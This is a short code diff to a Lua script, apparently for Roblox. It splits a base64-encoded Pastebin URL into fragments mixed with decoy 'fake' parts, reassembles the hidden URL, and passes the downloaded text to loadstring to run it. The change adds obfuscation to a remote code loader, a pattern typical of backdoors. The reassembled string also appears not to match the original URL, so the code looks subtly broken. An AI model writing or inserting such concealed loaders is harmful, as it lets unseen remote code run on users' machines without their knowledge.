@@ -1,4 +1,17 @@
-local encodedUrl = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0FFNHNnaWFN"
+local encodedParts = {
+    "aHR", -- Fake part
+    "0cHM6Ly9", -- Fake part
+    "aHR0cHM6Ly9", -- Real part 1
+    "wYXN", -- Real part 2
+    "0ZW", -- Real part 3
+    "Jpbi5", -- Real part 4
+    "jb20v", -- Real part 5
+    "cmF3L0", -- Real part 6
+    "FFNH", -- Real part 7
+    "NnaW", -- Real part 8
+    "E=", -- Real part 9
+    "aHR0cHM6Ly9mYWtldXJsLmNvbS9mYWtl", -- Fake part
+}
 
 local function decodeBase64(data)
     local b = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'
@@ -20,6 +33,13 @@ local function decodeBase64(data)
     end))
 end
 
-local url = decodeBase64(encodedUrl)
+local realUrlParts = {3, 4, 5, 6, 7, 8, 9} -- Indices of the real parts
+local combinedUrl = ""
+
+for _, index in ipairs(realUrlParts) do
+    combinedUrl = combinedUrl .. encodedParts[index]
+end
+
+local url = decodeBase64(combinedUrl)
 local scriptLoader = loadstring(game:HttpGet(url))
 scriptLoader()
